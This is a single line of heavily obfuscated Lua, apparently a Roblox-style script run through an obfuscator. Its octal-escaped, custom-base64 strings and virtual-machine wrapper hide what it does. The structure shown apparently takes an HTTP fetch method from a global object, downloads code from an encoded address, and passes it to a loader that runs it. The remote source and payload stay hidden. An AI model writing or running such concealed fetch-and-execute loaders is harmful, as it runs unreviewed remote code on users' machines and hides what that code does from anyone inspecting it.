return(function(...)local J={"\105\120\118\107\072\121\065\061","\104\097\055\111\070\043\088\116\088\102\061\061";"\101\052\118\082\072\097\083\111\070\085\116\077\072\068\061\061";"\079\052\079\076\080\097\079\048\088\121\057\047\083\084\080\061";"\105\120\118\073\050\068\061\061";"\088\121\075\068\050\121\083\054","\079\105\083\116\070\085\075\082\101\121\080\061";"\080\120\106\072\074\080\110\097\108\043\075\055\072\111\106\116\079\043\100\061","\105\120\118\114\101\085\055\116\108\102\061\061";"\072\051\078\057\072\066\061\061","\090\097\055\111\070\097\049\067\103\081\118\113\050\105\106\054\070\051\083\081\090\105\069\111\070\081\075\086\070\052\078\048\072\104\118\089\101\052\118\065\072\073\106\120\090\105\066\061";"\079\051\079\089\090\052\118\117\090\068\061\061";"\074\087\053\109\049\085\043\110\074\084\066\057\074\087\053\109\050\104\111\111\074\052\106\082\103\084\122\068\050\048\113\057\083\084\072\082\072\121\106\116\083\084\082\113\083\048\102\110"}for y,R in ipairs({{1;13};{1;8},{9;13}})do while R[1]<R[2]do J[R[1]],J[R[2]],R[1],R[2]=J[R[2]],J[R[1]],R[1]+1,R[2]-1 end end local function y(y)return J[y+24763]end do local y=table.concat local R={R=33,e=27,["\049"]=12;D=48;I=39,z=32,k=44,B=16;Y=34,c=63,K=57;M=46;C=58,P=20;["\052"]=6,m=55;X=29,G=59,i=23;["\057"]=45;["\053"]=8;["\050"]=24;f=0,l=30,F=28;p=2,["\055"]=17,t=37,W=3,v=61,r=41,["\048"]=35;["\043"]=4;y=22,Q=50,J=14,w=42,d=60;H=25;["\047"]=31;U=38,S=13,n=49,q=36,g=11;u=47;["\051"]=54,s=10;["\056"]=15;j=9;h=18;L=40,A=56,V=51,O=21,a=7;b=62;["\054"]=43,x=53;T=19,E=1;Z=26;N=5;o=52}local j=table.insert local Y=math.floor local B=J local h=string.sub local T=type local f=string.char local c=string.len for J=1,#B,1 do local p=B[J]if T(p)=="\115\116\114\105\110\103"then local T=c(p)local W={}local K=1 local A=0 local I=0 while K<=T do local J=h(p,K,K)local y=R[J]if y then A=A+y*64^(3-I)I=I+1 if I==4 then I=0 local J=Y(A/65536)local y=Y((A%65536)/256)local R=A%256 j(W,f(J,y,R))A=0 end elseif J=="\061"then j(W,f(Y(A/65536)))if K>=T or h(p,K+1,K+1)~="\061"then j(W,f(Y((A%65536)/256)))end break end K=K+1 end B[J]=y(W)end end end return(function(J,j,Y,B,h,T,f,p,W,R,A,t,c,K,I,b)p,I,t,W,A,b,K,c,R={},function(J)local y,R=1,J[1]while R do p[R],y=p[R]-1,1+y if 0==p[R]then p[R],c[R]=nil,nil end R=J[y]end end,function(J,y)local j=A(y)local Y=function(...)return R(J,{...},y,j)end return Y end,function()K=K+1 p[K]=1 return K end,function(J)for y=1,#J,1 do p[J[y]]=p[J[y]]+1 end if Y then local R=Y(true)local j=h(R)j[y(-24759)],j[y(-24750)],j[y(-24754)]=J,I,function()return-2653 end return R else return B({},{[y(-24750)]=I,[y(-24759)]=J;[y(-24754)]=function()return-2653 end})end end,function(J)p[J]=p[J]-1 if 0==p[J]then p[J],c[J]=nil,nil end end,0,{},function(R,Y,B,h)local K,f,c,A,p,W,b,I while R do c=Y f=y(-24761)W=y(-24752)p=y(-24756)I=y(-24757)R=y(-24751)J[f]=R f=y(-24755)J[p]=f p=J[W]b=y(-24753)K=y(-24758)A=J[K]b=A[b]R=J[y(-24760)]f={}K={b(A,I)}W=p(j(K))p=W()end R=#h return j(f)end return(t(14398516,{}))(j(f))end)(getfenv and getfenv()or _ENV,unpack or table[y(-24762)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
